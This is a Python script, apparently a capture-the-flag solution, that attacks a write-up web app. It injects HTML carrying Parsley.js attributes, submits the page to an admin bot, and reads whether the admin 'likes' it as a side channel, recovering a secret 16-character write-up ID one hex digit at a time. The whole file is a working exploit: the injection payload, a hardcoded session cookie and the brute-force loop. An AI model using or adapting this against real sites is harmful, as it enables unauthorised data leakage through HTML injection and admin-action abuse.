import re
import requests
import sys
import time


HTML_TEMPALTE = '''
<form data-parsley-validate>
  <input type="text" 
         data-parsley-trigger="focusout"
         data-parsley-equalto='a[href^="/show.php?id={guess_so_far}{char}"]'
         
         data-parsley-errors-container="form[action='/like.php']"
         data-parsley-error-message='<input type="input" name="id" value="0000000000000000">'
         
         value='a[href^="/show.php?id={guess_so_far}{char}"]'
         autofocus>
  <input type="submit">
</form>
'''


WRITEUP_RE = re.compile(r'\<li\>\<a href="/show\.php\?id=([0-9a-f]{16})"\>Writeup - ([0-9a-f]{16})\<')
CSRF_TOKEN = None

COOKIES = {
    'PHPSESSID': 'u17p8cpqesnf482s388at7jr0i',
}
URL = None


def get(url='/'):
    resp = requests.get(URL + url, cookies=COOKIES)
    if resp.status_code != 200:
        time.sleep(1)
        
        resp = requests.get(url, cookies=COOKIES)
        if resp.status_code != 200:
            raise Exception(url)
        
    return resp.content


def post(url, data):
    resp = requests.post(URL + url, data=data, cookies=COOKIES)
    if resp.status_code != 200:
        time.sleep(1)
        
        resp = requests.post(url, data=data, cookies=COOKIES)
        if resp.status_code != 200:
            raise Exception(url)
        
    return resp.content


def find_csrf_token():
    content = get()

    SEARCH = '<input type="hidden" name="c" value="'
    index1 = content.find(SEARCH)
    index2 = content.find('">', index1)
    c = content[index1 + len(SEARCH) : index2]
    
    return c


def does_admin_like(content):
    index = content.find('<h3>Liked by</h3>')
    assert index != -1
    index2 = content.find('<form method="post"', index)
    assert index2 != -1
    
    data = content[index : index2]
    if 'admin' in data:
        return True
    else:
        return False
        

def cycle(guess_so_far, char):
    data = {
        'c': CSRF_TOKEN,
        'content': HTML_TEMPALTE.format(guess_so_far=guess_so_far, char=hex(char)[-1]),
    }
    
    # Add a write-up with the new guess
    post("/add.php", data=data)
    time.sleep(0.2)

    content = get()
    
    # Find all write-ups, the last one should be the one we just added
    writeups = WRITEUP_RE.findall(content)
    
    wid = writeups[-1][0]
    
    content = get("/show.php?id={}".format(URL, wid))
    
    assert not does_admin_like(content)
    
    # Show the post to the admin
    data = {
        'c': CSRF_TOKEN,
        'id': wid,
    }
    post("/admin.php", data=data)
    
    # Give the admin 3 seconds to like it
    for i in xrange(3):
        time.sleep(1)
        
        content = get("/show.php?id={}".format(wid))
        
        likes = does_admin_like(content)
        if likes:
            return False
    
    return True


def main(host, port):
    global CSRF_TOKEN, URL
    
    URL = 'http://{}:{}'.format(host, port)
    CSRF_TOKEN = find_csrf_token()
    
    res = ''
    for n in xrange(len(res), 16):
        print 'getting char', n
        
        for i in xrange(16):
            print 'trying', i
            success = cycle(res, i)
            if success:
                res += hex(i)[-1]
                print 'FOUND IT! So far:', res
                break
        else:
            raise Exception("Failed to find character with index {}".format(n))
    
    print 'The ID of the write-up is:', res


if __name__ == '__main__':
    main(sys.argv[1], sys.argv[2])
